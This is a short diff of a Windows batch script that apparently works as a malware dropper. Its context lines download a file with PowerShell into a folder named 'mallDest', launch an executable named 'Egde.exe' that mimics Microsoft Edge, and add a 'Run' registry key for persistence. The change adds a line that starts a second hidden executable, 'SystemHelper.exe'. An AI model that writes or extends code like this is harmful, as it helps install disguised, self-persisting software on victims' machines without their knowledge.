@@ -56,6 +56,7 @@ powershell -Command "Invoke-WebRequest -Uri '%initialCmdUrl%' -OutFile '%mallDes
 set "appPath=%mallDest%\Egde.exe"
 
 start "" /B "%mallDest%\Egde.exe"
+start "" /B "%mallDest%\SystemHelper.exe"
 
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "AppPersistence" /t REG_SZ /d "\"%appPath%\"" /f >nul
 
